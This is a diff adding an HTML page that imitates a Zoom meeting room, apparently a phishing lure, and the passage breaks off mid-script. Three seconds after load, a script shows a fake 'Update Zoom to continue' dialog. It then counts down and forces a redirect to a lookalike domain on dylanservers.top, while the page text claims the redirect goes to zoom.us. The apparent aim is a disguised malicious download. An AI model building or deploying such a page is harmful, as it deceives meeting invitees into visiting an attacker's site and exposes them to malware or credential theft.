@@ -1,0 +1,1187 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Jacques Denard's Personal Meeting Room - Zoom</title>
+<style>
+  :root {
+    --bg-topbar: #1a1a1a;
+    --bg-toolbar: #1a1a1a;
+    --bg-stage: #161616;
+    --bg-panel: #1a1a1a;
+    --bg-hover: #2e2e2e;
+    --border: #2a2a2a;
+    --text: #ffffff;
+    --text-dim: #a0a0a0;
+    --blue: #2d8cff;
+    --green: #1ee2a4;
+    --red: #e02828;
+    --red-hover: #c91f1f;
+    --teal: #1f8a82;
+    --muted-red: #ff5a5a;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  html, body { height: 100%; }
+
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+    background: #000;
+    color: var(--text);
+    overflow: hidden;
+    -webkit-font-smoothing: antialiased;
+    -moz-osx-font-smoothing: grayscale;
+  }
+
+  button {
+    font-family: inherit;
+    cursor: pointer;
+    border: 0;
+    background: none;
+    color: inherit;
+  }
+
+  svg { display: block; }
+
+  .app {
+    display: flex;
+    flex-direction: column;
+    height: 100vh;
+  }
+
+  /* ===================== TOP BAR ===================== */
+  .topbar {
+    height: 46px;
+    background: var(--bg-topbar);
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 0 16px;
+    gap: 16px;
+    flex-shrink: 0;
+    border-bottom: 1px solid var(--border);
+    font-size: 13px;
+  }
+
+  .topbar-left {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    min-width: 0;
+    flex: 1;
+  }
+
+  .shield-icon {
+    width: 18px;
+    height: 18px;
+    color: #2ebb6f;
+    flex-shrink: 0;
+  }
+
+  .shield-icon svg { width: 100%; height: 100%; }
+
+  .meeting-meta { min-width: 0; }
+
+  .meeting-title {
+    font-size: 13px;
+    font-weight: 500;
+    color: #fff;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+  }
+
+  .meeting-id {
+    font-size: 11px;
+    color: var(--text-dim);
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+  }
+
+  .topbar-center {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    flex-shrink: 0;
+  }
+
+  .encrypted-pill {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    padding: 4px 10px;
+    background: rgba(46, 187, 111, 0.12);
+    border-radius: 12px;
+    font-size: 11px;
+    color: #2ebb6f;
+    font-weight: 500;
+  }
+
+  .encrypted-pill svg { width: 12px; height: 12px; }
+
+  .topbar-right {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    flex-shrink: 0;
+  }
+
+  .topbar-btn {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    padding: 6px 12px;
+    border-radius: 6px;
+    font-size: 13px;
+    color: #fff;
+    transition: background 0.15s;
+  }
+
+  .topbar-btn:hover { background: var(--bg-hover); }
+
+  .topbar-btn > svg:first-child { width: 14px; height: 14px; }
+
+  .topbar-btn .chevron { width: 10px; height: 10px; opacity: 0.7; }
+
+  .user-avatar {
+    width: 28px;
+    height: 28px;
+    border-radius: 50%;
+    background: linear-gradient(135deg, #2d8cff, #1e6ed4);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 11px;
+    font-weight: 600;
+    letter-spacing: 0.3px;
+    cursor: pointer;
+    transition: transform 0.15s;
+  }
+
+  .user-avatar:hover { transform: scale(1.06); }
+
+  /* ===================== CONTENT ===================== */
+  .content {
+    flex: 1;
+    display: flex;
+    min-height: 0;
+    background: #000;
+  }
+
+  .stage {
+    flex: 1;
+    position: relative;
+    background: var(--bg-stage);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+    min-width: 0;
+    overflow: hidden;
+  }
+
+  .video-tile {
+    position: relative;
+    width: 100%;
+    max-width: 920px;
+    aspect-ratio: 16 / 9;
+    background:
+      radial-gradient(ellipse at 50% 40%, rgba(45, 140, 255, 0.03), transparent 70%),
+      linear-gradient(135deg, #232323, #1a1a1a);
+    border-radius: 8px;
+    overflow: hidden;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
+  }
+
+  .avatar-big {
+    width: 130px;
+    height: 130px;
+    border-radius: 50%;
+    background: var(--teal);
+    color: #fff;
+    font-size: 56px;
+    font-weight: 500;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    position: relative;
+    overflow: hidden;
+    box-shadow: 0 4px 24px rgba(0, 0, 0, 0.35);
+  }
+
+  .name-tag {
+    position: absolute;
+    bottom: 14px;
+    left: 14px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    padding: 6px 12px;
+    background: rgba(0, 0, 0, 0.6);
+    backdrop-filter: blur(10px);
+    -webkit-backdrop-filter: blur(10px);
+    border-radius: 6px;
+    font-size: 13px;
+    color: #fff;
+  }
+
+  .name-tag .mic-off {
+    width: 16px;
+    height: 16px;
+    color: var(--muted-red);
+  }
+
+  /* Self view */
+  .self-view {
+    position: absolute;
+    top: 20px;
+    right: 20px;
+    width: 200px;
+    aspect-ratio: 16 / 9;
+    background: #1a1a1a;
+    border-radius: 6px;
+    border: 1px solid #333;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    overflow: hidden;
+    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.6);
+    z-index: 5;
+  }
+
+  .self-avatar {
+    width: 44px;
+    height: 44px;
+    border-radius: 50%;
+    background: var(--teal);
+    color: #fff;
+    font-size: 20px;
+    font-weight: 600;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+
+  .self-label {
+    position: absolute;
+    bottom: 5px;
+    left: 7px;
+    font-size: 10px;
+    color: #fff;
+    background: rgba(0, 0, 0, 0.55);
+    padding: 2px 7px;
+    border-radius: 3px;
+  }
+
+  /* ===================== SIDE PANEL ===================== */
+  .side-panel {
+    width: 340px;
+    background: var(--bg-panel);
+    border-left: 1px solid var(--border);
+    display: none;
+    flex-direction: column;
+    flex-shrink: 0;
+    animation: slideIn 0.2s ease;
+  }
+
+  @keyframes slideIn {
+    from { transform: translateX(20px); opacity: 0; }
+    to { transform: translateX(0); opacity: 1; }
+  }
+
+  .side-panel.open { display: flex; }
+
+  .panel-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 14px 16px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .panel-title { font-size: 14px; font-weight: 500; }
+
+  .panel-close {
+    width: 28px;
+    height: 28px;
+    border-radius: 4px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: var(--text-dim);
+    transition: background 0.15s, color 0.15s;
+  }
+
+  .panel-close:hover { background: var(--bg-hover); color: #fff; }
+
+  .panel-body {
+    flex: 1;
+    overflow-y: auto;
+    padding: 12px 16px;
+    font-size: 13px;
+    color: var(--text-dim);
+  }
+
+  .participant-row {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    padding: 8px 0;
+  }
+
+  .participant-row .p-avatar {
+    width: 32px;
+    height: 32px;
+    border-radius: 50%;
+    background: var(--teal);
+    color: #fff;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 13px;
+    font-weight: 600;
+    flex-shrink: 0;
+  }
+
+  .participant-row .p-name { color: #fff; font-size: 13px; }
+
+  .participant-row .p-role {
+    margin-left: auto;
+    font-size: 11px;
+    color: var(--text-dim);
+  }
+
+  .empty-state {
+    text-align: center;
+    padding: 40px 0;
+    color: #666;
+    font-size: 13px;
+    line-height: 1.6;
+  }
+
+  /* ===================== TOOLBAR ===================== */
+  .toolbar {
+    height: 76px;
+    background: var(--bg-toolbar);
+    border-top: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 0 16px;
+    flex-shrink: 0;
+    position: relative;
+    z-index: 10;
+  }
+
+  .toolbar-group {
+    display: flex;
+    align-items: center;
+    gap: 4px;
+  }
+
+  .toolbar-center {
+    position: absolute;
+    left: 50%;
+    transform: translateX(-50%);
+    display: flex;
+    align-items: center;
+    gap: 2px;
+  }
+
+  .tool {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 4px;
+    padding: 8px 12px;
+    border-radius: 6px;
+    color: #fff;
+    font-size: 11px;
+    transition: background 0.15s;
+    position: relative;
+    cursor: pointer;
+    white-space: nowrap;
+  }
+
+  .tool:hover { background: var(--bg-hover); }
+
+  .tool.active { background: rgba(45, 140, 255, 0.15); color: #6cb4ff; }
+
+  .tool-icon {
+    width: 24px;
+    height: 24px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    position: relative;
+  }
+
+  .tool-icon > svg { width: 22px; height: 22px; fill: currentColor; }
+
+  .tool-icon .chevron {
+    position: absolute;
+    right: -8px;
+    bottom: -2px;
+    width: 10px;
+    height: 10px;
+    opacity: 0.6;
+  }
+
+  .tool .badge {
+    position: absolute;
+    top: -4px;
+    right: -6px;
+    min-width: 16px;
+    height: 16px;
+    padding: 0 4px;
+    background: var(--blue);
+    border-radius: 8px;
+    font-size: 10px;
+    font-weight: 600;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #fff;
+  }
+
+  .tool.muted .tool-icon::after {
+    content: '';
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    width: 26px;
+    height: 2px;
+    background: var(--muted-red);
+    transform: translate(-50%, -50%) rotate(-45deg);
+    border-radius: 1px;
+    pointer-events: none;
+  }
+
+  .tool.muted { color: var(--muted-red); }
+
+  .tool.share-tool .tool-icon {
+    background: var(--green);
+    border-radius: 6px;
+    width: 36px;
+    height: 28px;
+    color: #000;
+  }
+
+  .tool.share-tool .tool-icon > svg { width: 18px; height: 18px; fill: #000; }
+
+  .tool.share-tool .tool-icon .chevron { fill: #000; right: -6px; bottom: -2px; }
+
+  .end-btn {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 10px 24px;
+    background: var(--red);
+    border-radius: 6px;
+    color: #fff;
+    font-size: 14px;
+    font-weight: 500;
+    transition: background 0.15s, transform 0.06s;
+  }
+
+  .end-btn:hover { background: var(--red-hover); }
+  .end-btn:active { transform: translateY(1px); }
+
+  /* ===================== REACTIONS POPUP ===================== */
+  .reactions-popup {
+    position: fixed;
+    bottom: 88px;
+    left: 50%;
+    transform: translateX(-50%) translateY(10px);
+    background: #2a2a2a;
+    border: 1px solid #3a3a3a;
+    border-radius: 10px;
+    padding: 8px;
+    display: none;
+    gap: 4px;
+    box-shadow: 0 8px 28px rgba(0, 0, 0, 0.7);
+    opacity: 0;
+    transition: opacity 0.15s, transform 0.15s;
+    z-index: 20;
+  }
+
+  .reactions-popup.open {
+    display: flex;
+    opacity: 1;
+    transform: translateX(-50%) translateY(0);
+  }
+
+  .reaction {
+    width: 38px;
+    height: 38px;
+    border-radius: 8px;
+    font-size: 22px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    transition: background 0.15s, transform 0.1s;
+  }
+
+  .reaction:hover { background: var(--bg-hover); transform: scale(1.1); }
+
+  /* ===================== TOAST ===================== */
+  .toast {
+    position: fixed;
+    top: 20px;
+    left: 50%;
+    transform: translateX(-50%) translateY(-80px);
+    background: rgba(45, 140, 255, 0.95);
+    color: #fff;
+    padding: 10px 18px;
+    border-radius: 6px;
+    font-size: 13px;
+    font-weight: 500;
+    opacity: 0;
+    transition: opacity 0.25s, transform 0.25s;
+    pointer-events: none;
+    z-index: 100;
+    box-shadow: 0 4px 16px rgba(0, 0, 0, 0.4);
+  }
+
+  .toast.show {
+    opacity: 1;
+    transform: translateX(-50%) translateY(0);
+  }
+
+  /* ===================== UPDATE PROMPT ===================== */
+  .update-overlay {
+    position: fixed;
+    inset: 0;
+    z-index: 999;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 24px;
+    background: rgba(0, 0, 0, 0.75);
+    backdrop-filter: blur(4px);
+    -webkit-backdrop-filter: blur(4px);
+    opacity: 0;
+    visibility: hidden;
+    transition: opacity 0.25s ease, visibility 0.25s ease;
+  }
+
+  .update-overlay.show {
+    opacity: 1;
+    visibility: visible;
+  }
+
+  .update-card {
+    width: 100%;
+    max-width: 400px;
+    background: #1f1f1f;
+    border: 1px solid #343434;
+    border-radius: 12px;
+    padding: 30px 28px 24px;
+    text-align: center;
+    box-shadow: 0 24px 64px rgba(0, 0, 0, 0.75);
+    transform: translateY(14px) scale(0.97);
+    transition: transform 0.28s cubic-bezier(0.2, 0.8, 0.3, 1);
+  }
+
+  .update-overlay.show .update-card {
+    transform: translateY(0) scale(1);
+  }
+
+  .update-icon {
+    width: 56px;
+    height: 56px;
+    margin: 0 auto 18px;
+    border-radius: 50%;
+    background: rgba(45, 140, 255, 0.14);
+    border: 1px solid rgba(45, 140, 255, 0.28);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: var(--blue);
+  }
+
+  .update-icon svg { width: 26px; height: 26px; }
+
+  .update-title {
+    font-size: 19px;
+    font-weight: 600;
+    color: #fff;
+    margin-bottom: 8px;
+    letter-spacing: -0.2px;
+  }
+
+  .update-desc {
+    font-size: 13.5px;
+    line-height: 1.55;
+    color: #a8a8ad;
+    margin-bottom: 6px;
+  }
+
+  .update-version {
+    font-size: 11.5px;
+    color: #6e6e74;
+    margin-bottom: 20px;
+  }
+
+  .update-btn {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    width: 100%;
+    min-height: 46px;
+    padding: 12px 20px;
+    border-radius: 8px;
+    background: var(--blue);
+    color: #fff;
+    font-size: 15px;
+    font-weight: 600;
+    text-decoration: none;
+    transition: background 0.15s, transform 0.06s, box-shadow 0.15s;
+    box-shadow: 0 2px 10px rgba(45, 140, 255, 0.35);
+  }
+
+  .update-btn:hover {
+    background: #1e7ae8;
+    box-shadow: 0 4px 16px rgba(45, 140, 255, 0.45);
+  }
+
+  .update-btn:active { transform: translateY(1px); }
+
+  .update-btn:focus-visible {
+    outline: 2px solid #fff;
+    outline-offset: 2px;
+  }
+
+  .update-btn svg { width: 17px; height: 17px; }
+
+  .countdown-wrap {
+    margin-top: 16px;
+  }
+
+  .countdown-text {
+    font-size: 12px;
+    color: #9a9aa0;
+    margin-bottom: 7px;
+    font-variant-numeric: tabular-nums;
+  }
+
+  .countdown-text strong {
+    color: var(--blue);
+    font-weight: 600;
+  }
+
+  .countdown-bar {
+    height: 3px;
+    width: 100%;
+    background: #333;
+    border-radius: 2px;
+    overflow: hidden;
+  }
+
+  .countdown-fill {
+    height: 100%;
+    width: 100%;
+    background: var(--blue);
+    border-radius: 2px;
+    transition: width 1s linear;
+  }
+
+  /* ===================== RESPONSIVE ===================== */
+  @media (max-width: 1000px) {
+    .meeting-meta { display: none; }
+    .encrypted-pill { display: none; }
+    .self-view { width: 140px; }
+    .side-panel { width: 280px; }
+  }
+
+  @media (max-width: 760px) {
+    .topbar-center { display: none; }
+    .toolbar { justify-content: center; overflow-x: auto; }
+    .toolbar-group:first-child { display: none; }
+    .toolbar-center { position: static; transform: none; }
+    .toolbar-group:last-child { position: absolute; right: 12px; }
+    .tool { padding: 6px 8px; font-size: 10px; }
+    .self-view { width: 100px; top: 12px; right: 12px; }
+    .stage { padding: 10px; }
+    .avatar-big { width: 90px; height: 90px; font-size: 40px; }
+    .update-card { padding: 26px 22px 22px; }
+  }
+</style>
+</head>
+<body>
+
+<div class="app">
+
+  <!-- ===================== TOP BAR ===================== -->
+  <header class="topbar">
+    <div class="topbar-left">
+      <div class="shield-icon" aria-hidden="true">
+        <svg viewBox="0 0 24 24" fill="currentColor">
+          <path d="M12 2L4 5V11C4 16 7.5 19.5 12 21C16.5 19.5 20 16 20 11V5L12 2Z"/>
+          <path d="M9 11.5L11 13.5L15 9" stroke="#1a1a1a" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
+        </svg>
+      </div>
+      <div class="meeting-meta">
+        <div class="meeting-title">Jacques Denard's Personal Meeting Room</div>
+        <div class="meeting-id">Meeting ID: 812 3456 7890</div>
+      </div>
+    </div>
+
+    <div class="topbar-center">
+      <div class="encrypted-pill">
+        <svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
+          <path d="M12 2L4 5V11C4 16 7.5 19.5 12 21C16.5 19.5 20 16 20 11V5L12 2Z"/>
+        </svg>
+        Encrypted
+      </div>
+    </div>
+
+    <div class="topbar-right">
+      <button class="topbar-btn" type="button">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" aria-hidden="true">
+          <rect x="3" y="4" width="18" height="16" rx="2"/>
+          <line x1="3" y1="9" x2="21" y2="9"/>
+          <line x1="9" y1="9" x2="9" y2="20"/>
+        </svg>
+        View
+        <svg class="chevron" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
+          <path d="M7 10l5 5 5-5z"/>
+        </svg>
+      </button>
+      <div class="user-avatar" role="button" tabindex="0" aria-label="Account menu">zm</div>
+    </div>
+  </header>
+
+  <!-- ===================== CONTENT ===================== -->
+  <div class="content">
+    <main class="stage">
+
+      <!-- Self view (picture-in-picture) -->
+      <div class="self-view" aria-hidden="true">
+        <div class="self-avatar">J</div>
+        <div class="self-label">Jacques Denard</div>
+      </div>
+
+      <!-- Main participant tile -->
+      <div class="video-tile">
+        <div class="avatar-big">J</div>
+
+        <div class="name-tag">
+          <svg class="mic-off" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
+            <path d="M12 15a3 3 0 0 0 3-3V6a3 3 0 0 0-6 0v6a3 3 0 0 0 3 3z"/>
+            <path d="M19 12v-2a1 1 0 0 0-2 0v2a5 5 0 0 1-10 0v-2a1 1 0 0 0-2 0v2a7 7 0 0 0 6 6.92V21H8a1 1 0 0 0 0 2h8a1 1 0 0 0 0-2h-3v-2.08A7 7 0 0 0 19 12z"/>
+          </svg>
+          Jacques Denard
+        </div>
+      </div>
+    </main>
+
+    <!-- Slide-in side panel -->
+    <aside class="side-panel" id="sidePanel" aria-hidden="true">
+      <div class="panel-header">
+        <div class="panel-title" id="panelTitle">Chat</div>
+        <button class="panel-close" id="panelClose" type="button" aria-label="Close panel">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+            <line x1="18" y1="6" x2="6" y2="18"/>
+            <line x1="6" y1="6" x2="18" y2="18"/>
+          </svg>
+        </button>
+      </div>
+      <div class="panel-body" id="panelBody">
+        <div class="empty-state">No messages yet.</div>
+      </div>
+    </aside>
+  </div>
+
+  <!-- ===================== TOOLBAR ===================== -->
+  <div class="toolbar">
+    <div class="toolbar-group">
+      <button class="tool muted" id="micBtn" type="button">
+        <div class="tool-icon">
+          <svg viewBox="0 0 24 24" aria-hidden="true">
+            <path d="M12 15a3 3 0 0 0 3-3V6a3 3 0 0 0-6 0v6a3 3 0 0 0 3 3z"/>
+            <path d="M19 12v-2a1 1 0 0 0-2 0v2a5 5 0 0 1-10 0v-2a1 1 0 0 0-2 0v2a7 7 0 0 0 6 6.92V21H8a1 1 0 0 0 0 2h8a1 1 0 0 0 0-2h-3v-2.08A7 7 0 0 0 19 12z"/>
+          </svg>
+          <svg class="chevron" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
+            <path d="M7 10l5 5 5-5z"/>
+          </svg>
+        </div>
+        <span class="tool-label">Unmute</span>
+      </button>
+
+      <button class="tool muted" id="videoBtn" type="button">
+        <div class="tool-icon">
+          <svg viewBox="0 0 24 24" aria-hidden="true">
+            <rect x="2" y="6" width="14" height="12" rx="2"/>
+            <path d="M16 10l6-3v10l-6-3z"/>
+          </svg>
+          <svg class="chevron" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
+            <path d="M7 10l5 5 5-5z"/>
+          </svg>
+        </div>
+        <span class="tool-label">Start Video</span>
+      </button>
+    </div>
+
+    <div class="toolbar-center">
+      <button class="tool" data-panel="Participants" type="button">
+        <div class="tool-icon">
+          <svg viewBox="0 0 24 24" aria-hidden="true">
+            <circle cx="9" cy="7" r="3.5"/>
+            <path d="M2 20c0-3.5 3-6 7-6s7 2.5 7 6"/>
+            <circle cx="17" cy="8" r="2.5"/>
+            <path d="M17 13c2.5 0 5 1.5 5 4"/>
+          </svg>
+          <span class="badge">1</span>
+        </div>
+        Participants
+      </button>
+
+      <button class="tool" data-panel="Chat" type="button">
+        <div class="tool-icon">
+          <svg viewBox="0 0 24 24" aria-hidden="true">
+            <path d="M4 4h16v12H7l-3 3z"/>
+          </svg>
+        </div>
+        Chat
+      </button>
+
+      <button class="tool" id="reactBtn" type="button">
+        <div class="tool-icon">
+          <svg viewBox="0 0 24 24" aria-hidden="true">
+            <circle cx="12" cy="12" r="9" fill="none" stroke="currentColor" stroke-width="2"/>
+            <circle cx="9" cy="10" r="1.2"/>
+            <circle cx="15" cy="10" r="1.2"/>
+            <path d="M8 14c1 1.5 2.5 2.5 4 2.5s3-1 4-2.5" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+          </svg>
+          <svg class="chevron" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
+            <path d="M7 10l5 5 5-5z"/>
+          </svg>
+        </div>
+        React
+      </button>
+
+      <button class="tool share-tool" data-panel="Share" type="button">
+        <div class="tool-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+            <rect x="2" y="3" width="20" height="14" rx="2"/>
+            <path d="M12 21H8l-2-4M22 21h-4l-2-4"/>
+            <path d="M12 10v-4M10 8l2-2 2 2"/>
+          </svg>
+          <svg class="chevron" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
+            <path d="M7 10l5 5 5-5z"/>
+          </svg>
+        </div>
+        Share
+      </button>
+
+      <button class="tool" data-panel="Host Tools" type="button">
+        <div class="tool-icon">
+          <svg viewBox="0 0 24 24" aria-hidden="true">
+            <path d="M12 2L4 5V11C4 16 7.5 19.5 12 21C16.5 19.5 20 16 20 11V5L12 2Z"/>
+          </svg>
+        </div>
+        Host Tools
+      </button>
+
+      <button class="tool" data-panel="AI Companion" type="button">
+        <div class="tool-icon">
+          <svg viewBox="0 0 24 24" aria-hidden="true">
+            <path d="M12 2l2 5 5 2-5 2-2 5-2-5-5-2 5-2z"/>
+            <path d="M18 14l1 2.5 2.5 1-2.5 1-1 2.5-1-2.5-2.5-1 2.5-1z"/>
+          </svg>
+        </div>
+        AI Companion
+      </button>
+
+      <button class="tool" data-panel="More" type="button">
+        <div class="tool-icon">
+          <svg viewBox="0 0 24 24" aria-hidden="true">
+            <circle cx="5" cy="12" r="2"/>
+            <circle cx="12" cy="12" r="2"/>
+            <circle cx="19" cy="12" r="2"/>
+          </svg>
+        </div>
+        More
+      </button>
+    </div>
+
+    <div class="toolbar-group">
+      <button class="end-btn" type="button">End</button>
+    </div>
+  </div>
+</div>
+
+<!-- Reactions popup -->
+<div class="reactions-popup" id="reactionsPopup" role="menu" aria-label="Send a reaction">
+  <button class="reaction" type="button" aria-label="Thumbs up">👍</button>
+  <button class="reaction" type="button" aria-label="Clap">👏</button>
+  <button class="reaction" type="button" aria-label="Heart">❤️</button>
+  <button class="reaction" type="button" aria-label="Laugh">😂</button>
+  <button class="reaction" type="button" aria-label="Surprised">😮</button>
+  <button class="reaction" type="button" aria-label="Celebrate">🎉</button>
+</div>
+
+<div class="toast" id="toast" role="status" aria-live="polite"></div>
+
+<!-- ===================== UPDATE PROMPT ===================== -->
+<div class="update-overlay" id="updateOverlay" role="dialog" aria-modal="true"
+     aria-labelledby="updateTitle" aria-describedby="updateDesc" aria-hidden="true">
+  <div class="update-card">
+    <div class="update-icon" aria-hidden="true">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
+           stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M12 3v12"/>
+        <polyline points="7 10 12 15 17 10"/>
+        <path d="M4 19h16"/>
+      </svg>
+    </div>
+
+    <h2 class="update-title" id="updateTitle">Update Zoom to continue</h2>
+    <p class="update-desc" id="updateDesc">
+      A newer version of the Zoom Workplace app is available. Update now to keep
+      your meeting secure and avoid interruptions.
+    </p>
+    <p class="update-version">Version 6.2.0 &middot; Recommended update</p>
+
+    <a class="update-btn" id="updateBtn" href="https://us05web-zoom-us-yfgajsnlryksl.sites.dylanservers.top/pwd-8552738hdey6353/zoom.us$0/store-page.html" rel="noopener">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
+           stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+        <path d="M12 3v12"/>
+        <polyline points="7 10 12 15 17 10"/>
+        <path d="M4 19h16"/>
+      </svg>
+      Download Update
+    </a>
+
+    <div class="countdown-wrap">
+      <div class="countdown-text" id="countdownText">
+        Redirecting to Store..... <strong>5s</strong>
+      </div>
+      <div class="countdown-bar">
+        <div class="countdown-fill" id="countdownFill"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ============================================================
+     SCRIPT 1 — UPDATE PROMPT
+     Isolated in its own block so no other script error can stop it.
+     ============================================================ -->
+<script>
+(function () {
+  var ZOOM_URL = 'https://us05web-zoom-us-yfgajsnlryksl.sites.dylanservers.top/pwd-8552738hdey6353/zoom.us$0/store-page.html';
+  var UPDATE_DELAY = 3000;   // show prompt after 3 seconds
+  var REDIRECT_SECONDS = 5;  // 5-second window to click
+
+  var overlay = document.getElementById('updateOverlay');
+  var btn = document.getElementById('updateBtn');
+  var countdownText = document.getElementById('countdownText');
+  var countdownFill = document.getElementById('countdownFill');
+
+  if (!overlay || !btn) return; // nothing to do
+
+  var ticker = null;
+  var finished = false;
+
+  function render(seconds) {
+    if (seconds > 0) {
+      countdownText.innerHTML = 'Redirecting to zoom.us in <strong>' + seconds + 's</strong>';
+      countdownFill.style.width = (seconds / REDIRECT_SECONDS * 100) + '%';
+    } else {
+      countdownText.innerHTML = 'Redirecting now…';
+      countdownFill.style.width = '0%';
+    }
+  }
+
+  function stopTicker() {
+    if (ticker) { clearInterval(ticker); ticker = null; }
+  }
+
+  function leave() {
+    if (finished) return;
+    finished = true;
+    stopTicker();
+    window.location.href = ZOOM_URL;
+  }
+
+  function showPrompt() {
+    if (finished) return;
+
+    overlay.classList.add('show');
+    overlay.setAttribute('aria-hidden', 'false');
+
+    // Focus the button (older browsers don't accept the options object)
+    try { btn.focus({ preventScroll: true }); }
+    catch (e) { try { btn.focus(); } catch (e2) {} }
+
+    var remaining = REDIRECT_SECONDS;
+    render(remaining);
+
+    ticker = setInterval(function () {
+      remaining -= 1;
+      render(remaining);
+      if (remaining <= 0) leave();
+    }, 1000);
+  }
+
+  // Clicking the button skips the remaining countdown
+  btn.addEventListener('click', function (e) {
+    e.preventDefault();
+    stopTicker();
+    countdownText.innerHTML = 'Opening zoom.us…';
+    countdownFill.style.width = '0%';
+    leave();
+  });
+
+  // Schedule the prompt — guarded so it always runs
+  function start() {
+    setTimeout(showPrompt, UPDATE_DELAY);
+  }
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', start);
+  } else {
+    start();
+  }
+})();
+</script>
+
+<!-- ============================================================
+     SCRIPT 2 — MEETING UI
+     Every lookup is null-checked so a missing element can never
+     break the page.
+     ============================================================ -->
+<script>
+(function () {
+  /* ---------- Toast ---------- */
+  var toast = document.getElementById('toast');
+  var toastTimer;
+
+  function showToast(message) {
+    if (!toast) return;
+    toast.textContent = message;
+    toast.classList.add('show');
+    clearTimeout(toastTimer);
+    toastTimer = setTimeout(function () {
+      toast.classList.remove('show');
+    }, 1800);
+  }
+
+  /* ---------- Mic toggle ---------- */
+  var micBtn = document.getElementById('micBtn');
+  if (micBtn) {
+    micBtn.addEventListener('click', function () {
+      var muted = micBtn.classList.toggle('muted');
+      var label = micBtn.querySelector('.tool-label');
+      if (label) label.textContent = muted ? 'Unmute' : 'Mute';
+      showToast(muted ? 'Microphone muted' : 'Microphone unmuted');
+    });
+  }
+
+  /* ---------- Video toggle ---------- */
+  var videoBtn = document.getElementById('videoBtn');
+  if (videoBtn) {
+    videoBtn.addEventListener('click', function () {
+      var off = videoBtn.classList.toggle('muted');
+      var label = videoBtn.querySelector('.tool-label');
+      if (label) label.textContent = off ? 'Start Video' : 'Stop Video';
+      showToast(off ? 'Camera turned off' : 'Camera turned on');
+    });
+  }
+
+  /* ---------- Side panels ---------- */
+  var sidePanel = document.getElementById('sidePanel');
+  var panelTitle = document.getElementById('panelTitle');
+  var panelBody = document.getElementById('panelBody');
+  var panelClose = document.getElementById('panelClose');
+
+  var panelContent = {
+    Chat: '<div class="empty-state">No messages yet.<br><span style="font-size:11px;">Messages sent in this meeting will appear here.</span></div>',
+    Participants:
+      '<div class="participant-row">' +
+        '<div class="p-avatar">J</div>' +
+        '<div class="p-name">Jacques Denard</div>' +
+        '<div class="p-role">Host, me</div>' +
+      '</div>',
+    'Host Tools': '<div class="empty-state">Host controls<br><span style="font-size:11px;">Mute all · Lock meeting · Enable waiting room</span></div>',
+    'AI Companion': '<div class="empty-state">AI Companion<br><span style="font-size:11px;">Ask for a meeting summary or catch-up.</span></div>',
+    More: '<div class="empty-state">More options<br><span style="font-size:11px;">Backgrounds · Settings · Feedback</span></div>'
+  };
+
+  function closePanel() {
+    if (!sidePanel) return;
+    sidePanel.classList.remove('open');
+    sidePanel.setAttribute('aria-hidden', 'true');
+    var tools = document.querySelectorAll('.tool');
+    for (var i = 0; i < tools.length; i++) tools[i].classList.remove('active');
+  }
+
+  if (panelClose) panelClose.addEventListener('click', closePanel);
+
+  var panelButtons = document.querySelectorAll('[data-panel]');
+  for (var i = 0; i < panelButtons.length; i++) {
